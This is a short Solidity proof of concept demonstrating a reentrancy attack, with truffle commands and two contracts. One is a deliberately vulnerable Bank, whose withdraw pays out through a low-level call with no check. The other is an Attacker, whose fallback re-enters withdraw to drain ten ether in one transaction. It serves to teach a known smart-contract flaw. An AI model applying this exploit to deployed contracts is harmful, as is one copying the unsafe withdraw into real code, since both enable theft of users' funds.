 /***
Proof of concept for reentrancy-attack

Commands used (in truffle develop):

migrate --reset

Bank.deployed().then(instance => bankAddress = instance.address)
Bank.deployed().then(instance => instance.deposit({value: web3.toWei(10, "ether")}))

web3.fromWei(web3.eth.getBalance(bankAddress).toNumber())
web3.fromWei(web3.eth.getBalance(Attacker.address).toNumber())

Attacker.deployed().then(instance => instance.start())

web3.fromWei(web3.eth.getBalance(bankAddress).toNumber())
web3.fromWei(web3.eth.getBalance(Attacker.address).toNumber())

Result: Instead of just getting 1 ether it will get the whole
10 ether with one tx

***/

pragma solidity ^0.4.20;


contract Bank {
    function deposit() public payable {}

    function withdraw() public payable {
        // send 1 ether to caller
        if (!msg.sender.call.value(1 ether)()) {
            revert();
        }
    }
}


contract Attacker {
    Bank public b;
    uint8 public countWithdraw = 0;

    function Attacker(address _bank) public {
        b = Bank(_bank);
    }

    function start() public payable {
        countWithdraw = 0;
        b.withdraw();
    }

    function () public payable {
        countWithdraw++;
        if (countWithdraw < 10) {
            b.withdraw();
        }
    }
}
